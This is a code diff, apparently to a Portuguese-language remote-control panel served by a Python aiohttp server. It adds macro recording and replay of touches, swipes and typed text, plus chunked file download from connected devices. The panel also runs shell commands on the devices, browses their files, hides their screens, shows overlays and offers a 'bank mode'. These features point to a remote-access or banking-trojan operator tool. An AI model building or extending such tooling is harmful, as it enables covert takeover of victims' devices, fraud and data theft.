@@ -2,7 +2,7 @@
 import asyncio, json, os, socket, time
 from aiohttp import web, WSMsgType
 
-TOKEN = "m4t7k2p9x6v3n8b5z1q0w7r2"
+TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
 DEVS = {}
 VIEW = {}
 BUSY = set()
@@ -76,7 +76,7 @@ input{flex:1;cursor:text}
 <button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
 <button onclick="zoom(-1)">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)">+</button><button id=mg onclick="mag=!mag;this.style.opacity=mag?1:.4">ima</button><button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
 <button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button>
-<button onclick="banco()">Modo banco</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
+<button onclick="banco()">Modo banco</button><button onclick="recTog()">REC</button><span id=rc class=sm>0</span><button onclick="playM()">Play</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
 </header>
 <main><div id=wrap><img id=scr><div id=st></div></div>
 <aside>
@@ -158,7 +158,7 @@ function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'ne
   if(sel&&w&&w.readyState===1)w.send(JSON.stringify({c:'sel',id:sel}))}
 dev.onchange=pick;
 function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
-function k(n){c('key',{code:n})}
+function k(n){c('key',{code:n});push({k:n})}
 function send(){const e=$('#t'),v=e.value;
   if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';
     e.placeholder='texto  |  $comando  |  /ls path  |  /dl path';return}
@@ -166,7 +166,7 @@ function send(){const e=$('#t'),v=e.value;
   if(v[0]==='$')c('shell',{cmd:v.slice(1)});
   else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
   else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
-  else c('text',{s:v});e.value=''}
+  else {c('text',{s:v});push({x:v});e.value=''}
 $('#t').onkeydown=e=>{if(e.key==='Enter')send()};
 function pt(e){
   const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
@@ -208,9 +208,9 @@ i.onmousemove=e=>{if(!dn)return;const u=snap(pt(e));
 i.onmouseup=e=>{clearTimeout(env);if(!dn)return;const u=snap(pt(e));
   const m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
   if(jaEnviado&&m<18){dn=null;return}
-  if(m<18&&Date.now()-t0>480)c('long',{x:u.x,y:u.y});
-  else if(m<18)c('touch',{x:u.x,y:u.y});
-  else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});dn=null};
+  if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}
+  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}
+  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};
 function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
 function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
 function rec(){
@@ -284,14 +284,30 @@ function lista(o){
       if(dir){$('#p').value=base+nome+'/';ls()}else c('dl',{p:base+nome})};
     f.appendChild(d)});
 }
+let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
 function baixa(o){
+  if(o==='fim'){fechaDl();return}
   const m=o.match(/b64=([\s\S]*)/);
   if(!m){log(o);return}
-  const bin=atob(m[1].replace(/\s/g,'')),u=new Uint8Array(bin.length);
-  for(let x=0;x<bin.length;x++)u[x]=bin.charCodeAt(x);
-  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([u]));
-  a.download=(pasta.split('/').pop()||'arq');a.click();log('baixado')
+  const tot=+(o.match(/total=(\d+)/)||[0,0])[1];
+  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
+  const b=atob(m[1].replace(/\s/g,''));
+  for(let i=0;i<b.length;i++)dlBuf.push(b.charCodeAt(i));
+  dlOff+=b.length;
+  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()
 }
+function fechaDl(){
+  const u=new Uint8Array(dlBuf),a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([u]));
+  a.download=(dlPath.split('/').pop()||'arq');a.click();
+  dlBuf=null;dlTot=-1;log('baixado')
+}
+let mrec=[],mlast=0,mrecOn=false;
+function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
+  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6b7785'}
+function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
+  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
+function playM(){if(!mrec.length){log('nada gravado');return}c('macro',{s:mrec})}
 function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
   if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
   c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
